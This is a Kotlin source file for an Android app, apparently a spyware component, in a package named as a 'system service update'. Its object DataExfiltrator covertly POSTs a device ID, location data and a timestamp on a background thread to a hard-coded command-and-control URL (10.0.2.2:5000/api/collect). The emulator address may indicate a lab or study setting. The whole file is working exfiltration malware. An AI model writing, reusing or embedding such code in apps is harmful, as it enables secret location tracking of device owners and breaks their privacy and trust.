package com.example.systemserviceupdate

import java.net.HttpURLConnection
import java.net.URL

object DataExfiltrator {
    private const val C2_SERVER_URL = "http://10.0.2.2:5000/api/collect"
    private const val DEVICE_ID = "mobile_device_001"

    fun sendToC2(data: String) {
        Thread {
            try {
                val url = URL(C2_SERVER_URL)
                val connection = url.openConnection() as HttpURLConnection
                connection.requestMethod = "POST"
                connection.doOutput = true
                connection.setRequestProperty("Content-Type", "application/json; charset=utf-8")
                connection.setRequestProperty("Accept", "application/json")
                connection.connectTimeout = 10000
                connection.readTimeout = 10000

                val payload = """
                    {
                        "device_id": "$DEVICE_ID",
                        "location": "$data",
                        "timestamp": "${System.currentTimeMillis()}"
                    }
                """.trimIndent()

                connection.outputStream.use { os ->
                    val input = payload.toByteArray(Charsets.UTF_8)
                    os.write(input, 0, input.size)
                }

                val responseCode = connection.responseCode
                if (responseCode == 200) {
                    android.util.Log.d("DataExfiltrator", "Daten erfolgreich gesendet")
                } else {
                    android.util.Log.e("DataExfiltrator", "Server Fehler: $responseCode")
                }

                connection.disconnect()

            } catch (e: Exception) {
                android.util.Log.e("DataExfiltrator", "Netzwerk Fehler: ${e.message}")
            }
        }.start()
    }
}